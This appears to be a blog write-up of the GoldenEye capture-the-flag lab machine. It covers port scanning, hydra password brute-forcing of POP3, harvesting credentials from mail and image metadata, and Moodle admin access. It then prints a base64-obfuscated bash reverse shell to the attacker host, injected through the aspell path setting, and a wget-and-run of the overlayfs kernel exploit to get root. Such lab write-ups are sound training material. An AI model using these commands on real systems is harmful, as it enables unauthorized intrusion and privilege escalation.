@@ -1,0 +1,331 @@
+I"�M<p>This is a machine created by <strong>creosote</strong>, the goal is to get root and capture the secret GoldenEye codes.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>I discovered the target machine on the local network.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24 
+Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
+WARNING: host part of 192.168.179.1/24 is non-zero
+Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.179.156 00:0c:29:e1:fb:07       VMware, Inc.
+192.168.179.254 00:50:56:fd:22:9e       VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>I did a full TCP port scan to discover for open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-p-</span> <span class="nt">-T4</span> 192.168.179.156 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT      STATE SERVICE REASON
+25/tcp    open  smtp    syn-ack ttl 64
+80/tcp    open  http    syn-ack ttl 64
+55006/tcp open  unknown syn-ack ttl 64
+55007/tcp open  unknown syn-ack ttl 64
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>I performed service detection on open ports and script scanning on the target machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p25</span>,80,55006,55007 192.168.179.156 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT      STATE SERVICE     VERSION
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>80/tcp    open  http        Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: GoldenEye Primary Admin Server
+55006/tcp open  ssl/unknown
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Dovecot mail server
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Dovecot mail server
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2018-04-24T03:23:52
+| Not valid after:  2028-04-23T03:23:52
+| MD5:   d039 2e71 c76a 2cb3 e694 ec40 7228 ec63
+|_SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>55007/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: PIPELINING STLS USER RESP-CODES CAPA AUTH-RESP-CODE SASL<span class="o">(</span>PLAIN<span class="o">)</span> UIDL TOP
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>In the web service, I could see a directory path to login, but I don’t have the credentials, so I proceeded to look at the page source and found the terminal.js link, I clicked on it and this redirected me to a note with the encoded password of the user Boris, and a user named Natalya.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-1.png" alt="" /></p>
+
+<p><img src="/assets/images/goldeneye/screenshot-2.png" alt="" /></p>
+
+<p><img src="/assets/images/goldeneye/screenshot-3.png" alt="" /></p>
+
+<p>This string is HTML encoding, so I decoded it and got the password in plain text.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-4.png" alt="" /></p>
+
+<p>I proceeded to log in to the page as the Boris user.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-5.png" alt="" /></p>
+
+<p><img src="/assets/images/goldeneye/screenshot-6.png" alt="" /></p>
+
+<p>When reviewing the page source the users Natalya and Boris were revealed.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-7.png" alt="" /></p>
+
+<h3 id="pop3-enumeration">POP3 Enumeration</h3>
+
+<p>I proceeded to perform brute force the pop3 service with the Boris user but was unsuccessful, so I tried it with the Natalya user and found her password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>hydra <span class="nt">-l</span> natalya <span class="nt">-P</span> /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt pop3://192.168.179.156 <span class="nt">-s</span> 55006  <span class="nt">-t</span> 50 <span class="nt">-S</span>
+...
+<span class="o">[</span>55006][pop3] host: 192.168.179.156   login: natalya   password: bird
+...
+</code></pre></div></div>
+
+<p>Then I logged in to pop3 and found the xenia’s creds and a domain name that must be saved in the hosts file of the system.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> 192.168.179.156:55006 <span class="nt">-crlf</span> <span class="nt">-quiet</span>
+...
+USER natalya
++OK
+PASS bird
++OK Logged <span class="k">in</span><span class="nb">.</span>
+list
++OK 2 messages:
+1 631
+2 1048
+<span class="nb">.</span>
+retr 2
++OK 1048 octets
+Return-Path: &lt;root@ubuntu&gt;
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root <span class="o">(</span>localhost <span class="o">[</span>127.0.0.1]<span class="o">)</span>
+        by ubuntu <span class="o">(</span>Postfix<span class="o">)</span> with SMTP <span class="nb">id </span>17C96454B1
+        <span class="k">for</span> &lt;natalya&gt;<span class="p">;</span> Tue, 29 Apr 1995 20:19:42 <span class="nt">-0700</span> <span class="o">(</span>PDT<span class="o">)</span>
+Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;
+Date: Tue, 29 Apr 1995 20:19:42 <span class="nt">-0700</span> <span class="o">(</span>PDT<span class="o">)</span>
+From: root@ubuntu
+
+Ok Natalyn I have a new student <span class="k">for </span>you. As this is a new system please <span class="nb">let </span>me or boris know <span class="k">if </span>you see any config issues, especially is it<span class="s1">'s related to security...even if it'</span>s not, just enter it <span class="k">in </span>under the guise of <span class="s2">"security"</span>...it<span class="s1">'ll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn'</span>t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+<span class="k">**</span>Make sure to edit your host file since you usually work remote off-network....
+
+Since you<span class="s1">'re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+</span></code></pre></div></div>
+
+<p>I assigned the domain name to the hosts file of my system.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'192.168.179.156 severnaya-station.com'</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div></div>
+
+<p>I requested that domain name and this redirected me to a moodle platform.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-8.png" alt="" /></p>
+
+<p>I logged in as the xenia user.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-9.png" alt="" /></p>
+
+<p>As we see at the bottom of the page, we have a message from Dr Doak.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-10.png" alt="" /></p>
+
+<p>I clicked on <strong>Go to messages</strong>, it’s a welcome message for Xenia from Doak, he tells her that she can only communicate with him via email.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-11.png" alt="" /></p>
+
+<p>Then with the Doak user I brute force and found his password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>hydra <span class="nt">-l</span> doak <span class="nt">-P</span> /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt pop3://192.168.179.156 <span class="nt">-s</span> 55006  <span class="nt">-t</span> 50 <span class="nt">-S</span>
+...
+<span class="o">[</span>55006][pop3] host: 192.168.179.156   login: doak   password: goat
+...
+</code></pre></div></div>
+
+<p>I logged in to the pop3 service and found his credentials for the moodle platform.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> 192.168.179.156:55006 <span class="nt">-crlf</span> <span class="nt">-quiet</span>
+...
+USER doak
++OK
+PASS goat
++OK Logged <span class="k">in</span><span class="nb">.</span>
+list
++OK 1 messages:
+1 606
+<span class="nb">.</span>
+retr 1
++OK 606 octets
+Return-Path: &lt;doak@ubuntu&gt;
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak <span class="o">(</span>localhost <span class="o">[</span>127.0.0.1]<span class="o">)</span>
+        by ubuntu <span class="o">(</span>Postfix<span class="o">)</span> with SMTP <span class="nb">id </span>97DC24549D
+        <span class="k">for</span> &lt;doak&gt;<span class="p">;</span> Tue, 30 Apr 1995 20:47:24 <span class="nt">-0700</span> <span class="o">(</span>PDT<span class="o">)</span>
+Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;
+Date: Tue, 30 Apr 1995 20:47:24 <span class="nt">-0700</span> <span class="o">(</span>PDT<span class="o">)</span>
+From: doak@ubuntu
+
+James,
+If you<span class="s1">'re reading this, congrats you'</span>ve gotten this far. You know how tradecraft works right?
+
+Because I don<span class="s1">'t. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+</span></code></pre></div></div>
+
+<p>I logged in to moodle as dr_doak.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-12.png" alt="" /></p>
+
+<p>In the following path I found the s3cret.txt file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My profile -&gt; My private files
+</code></pre></div></div>
+
+<p><img src="/assets/images/goldeneye/screenshot-13.png" alt="" /></p>
+
+<p>I downloaded the s3cret.txt file, and the message let us know that the admin’s credentials was able to capture in plain text, and that juicy information is in a specified path.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span><span class="nb">cat </span>s3cret.txt 
+007,
+
+I was able to capture this apps adm1n cr3ds through clear txt. 
+
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
+
+Something juicy is located here: /dir007key/for-007.jpg
+
+Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+</code></pre></div></div>
+
+<p>This is an image, so I downloaded it to the attacking machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>wget http://severnaya-station.com/dir007key/for-007.jpg
+</code></pre></div></div>
+
+<p>I analized the exif data and found a base64 encoded string, filtered the string and decoded it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>exif <span class="k">for</span><span class="nt">-007</span>.jpg | <span class="nb">grep </span>Image | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"|"</span> <span class="s1">'{print $NF}'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+xWinter1995x!
+</code></pre></div></div>
+
+<p>Then I logged in to moodle platform as admin user.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-14.png" alt="" /></p>
+
+<p><img src="/assets/images/goldeneye/screenshot-15.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="remote-command-execution">Remote Command Execution</h3>
+
+<p>This version 2.2.3 of moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests.</p>
+
+<p>To exploit this, we need to locate ourselves in the following path:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Site administration -&gt; Server -&gt; System paths
+</code></pre></div></div>
+
+<p>Then I base64 encoded the bash reverse shell to obfuscate it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span> | <span class="nb">base64</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span>
+L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzkuMS80NDMgMD4mMSIK
+</code></pre></div></div>
+
+<p>In the <strong>Path to aspell</strong> box we enter the following instruction, and save the changes.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="si">$(</span><span class="nb">echo</span> <span class="s1">'L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzkuMS80NDMgMD4mMSIK'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash<span class="si">)</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/goldeneye/screenshot-16.png" alt="" /></p>
+
+<p>Then, in the path:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Site administration -&gt; Plugins -&gt; Text editors -&gt; TinyMCE HTML editor
+</code></pre></div></div>
+
+<p>At <strong>Spell engine</strong> we select <strong>PspellShell</strong> and save the changes.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-17.png" alt="" /></p>
+
+<p>And finally, in the path:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Site administration -&gt; Courses -&gt; Add/edit courses
+</code></pre></div></div>
+
+<p>Then, we click on <strong>Add a new course</strong>, before to execute the reverse shell we need set up a netcat listener and then click on <strong>Toggle spellchecker</strong>.</p>
+
+<p><img src="/assets/images/goldeneye/screenshot-18.png" alt="" /></p>
+
+<p>We got a shell, with the permissions that the moodle platform is running.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.156] 48348
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1141<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Googling I found that this version of the kernel is vulnerable to the overlayfs exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/dev/shm<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+Linux ubuntu 3.13.0-32-generic <span class="c">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="kernel-exploit">Kernel Exploit</h3>
+
+<p>The issue lies in the ovl_setattr function in fs/overlayfs/inode.c in the Linux kernel through 4.3.3 attempts to merge distinct setattr operations, which allows local users to bypass intended access restrictions and modify the attributes of arbitrary overlay files via a crafted application.</p>
+
+<p>I downloaded the exploit to the attacking machine, in the exploit I modified gcc to cc since the gcc compiler doesn’t exist on the target machine, I compiled it and started the apache service, you can download the exploit <a href="https://www.exploit-db.com/exploits/37292">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/GoldenEye<span class="nv">$ </span>wget <span class="nt">--quiet</span> https://www.exploit-db.com/download/37292 <span class="nt">-O</span> ofs.c
+root@kali:~/GoldenEye<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/gcc -/cc -/'</span> ofs.c
+root@kali:~/GoldenEye<span class="nv">$ </span>gcc ofs.c <span class="nt">-o</span> /var/www/html/ofs
+root@kali:~/GoldenEye<span class="nv">$ </span>systemctl start apache2
+</code></pre></div></div>
+
+<p>I transferred the exploit to the target machine, granted it execute privileges, ran it, and got root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/dev/shm<span class="nv">$ </span>wget <span class="nt">-q</span> 192.168.179.1/ofs <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x ofs <span class="o">&amp;&amp;</span> ./ofs
+spawning threads
+mount <span class="c">#1</span>
+mount <span class="c">#2</span>
+child threads <span class="k">done</span>
+/etc/ld.so.preload created
+creating shared library
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+<span class="c"># cat .flag.txt</span>
+Alec told me to place the codes here: 
+
+568628e0d993b1973adc718237da6e93
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/
+</code></pre></div></div>
+
+<p><img src="/assets/images/goldeneye/screenshot-19.png" alt="" /></p>
+:ET
